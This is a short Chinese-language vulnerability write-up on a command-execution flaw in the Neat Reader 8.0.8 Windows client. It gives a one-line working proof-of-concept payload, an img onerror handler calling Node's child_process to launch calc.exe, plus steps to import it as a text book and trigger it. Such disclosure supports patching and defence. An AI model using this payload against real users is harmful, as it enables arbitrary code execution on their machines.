---
title: Neat Reader存在命令执行漏洞
slug: 0027
---
# **Neat Reader存在命令执行漏洞**

**Neat Reader存在命令执行漏洞**

**一、**漏洞描述****

**北京高知图新教育科技有限公司，成立于2016年，Neat Reader 是该公司旗下的产品。致力于打造一个满足现代需求的 EPUB/TXT 阅读器，Neat Reader 拥有强大的解析引擎，支持 ePub 和 Txt，无论是任何类型的图书，都能完美展现，提供最佳阅读效果。Neat Reader存在命令执行漏洞，攻击者可以使用此漏洞进行恶意命令执行。**

**二、漏洞影响**

**Windows客户端8.0.8**

**三、漏洞复现**

**创建一个文本文档，填入以下payload：**

**<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>">**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964787680-9656add6-9dd1-4495-9301-fe128b504eab.png)**



**打开 Neat Reader，点击添加图书，选择包含payload的文本文档导入。**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964788169-196637a4-296f-45da-a5ee-2699f20862b9.png)**



**导入后如下图所示**



**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964787907-2cdede96-85ce-4d32-a535-f22fa3da5466.png)**



**点击新添加的文本文档，触发payload成功。**



**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964789827-b2344a2d-2a57-4477-aedc-230879c5c5cc.png)**